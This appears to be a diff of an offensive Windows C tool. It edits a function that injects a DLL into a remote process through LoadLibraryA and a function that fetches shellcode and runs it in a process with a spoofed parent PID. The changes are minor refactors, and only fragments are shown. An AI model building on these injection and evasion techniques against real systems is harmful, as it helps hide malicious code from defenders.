@@ -1,6 +1,5 @@
 #include <stdio.h>
 #include <windows.h>
-#include <Shlwapi.h>
 
 #include "Common.h"
 #include "Structs.h"
@@ -72,7 +71,7 @@ BOOL RemoteProcessDllInjection(IN DWORD dwMemoryType, IN LPCSTR lpProcessName, I
 	PVOID pLoadLibrary = NULL, pDllPathAddr = NULL;
 	char Pwd[MAX_PATH * 2], AbsolutePath[MAX_PATH*4];
 	HANDLE hThread = NULL, hProcess = NULL;
-	SIZE_T sShellcodePathSize;
+	SIZE_T sShellcodePathSize=0;
 	DWORD dwThreadId, dwProcessId;
 
 	if ((pLoadLibrary = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA")) == NULL)
@@ -82,8 +81,8 @@ BOOL RemoteProcessDllInjection(IN DWORD dwMemoryType, IN LPCSTR lpProcessName, I
 	if (!ObtainProcessHandle(dwEnumerationMethod, lpProcessName, &hProcess, &dwProcessId))
 		return FALSE;
 
-	// If it's relative path, prepend PWD to it
-	if (!IsAbsolutePath(lpShellcodePath))
+	//If it's relative path, prepend PWD to it
+	if (PathIsRelativeA(lpShellcodePath))
 	{
 		GetCurrentDirectoryA(MAX_PATH * 2, Pwd);
 		sprintf_s(AbsolutePath, MAX_PATH*4, "%s\\%s", Pwd, lpShellcodePath);
@@ -115,7 +114,7 @@ BOOL PPIDSpoofing(IN LPCSTR lpProcessName, IN LPCSTR lpParentProcessName, IN LPC
 	if (!FetchShellcode(lpShellcodePath, &pShellcode, &sShellcodeSize))
 		return FALSE;
 
-	if (!RunPPIDSpoofedProcess(lpProcessName, lpParentProcessName, &hProcess, &hThread))
+	if (!CreatePPIDSpoofedProcess(NULL, lpProcessName, lpParentProcessName, &hProcess, &hThread))
 		return FALSE;
 
 	if (!AllocateMemory(NULL, hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
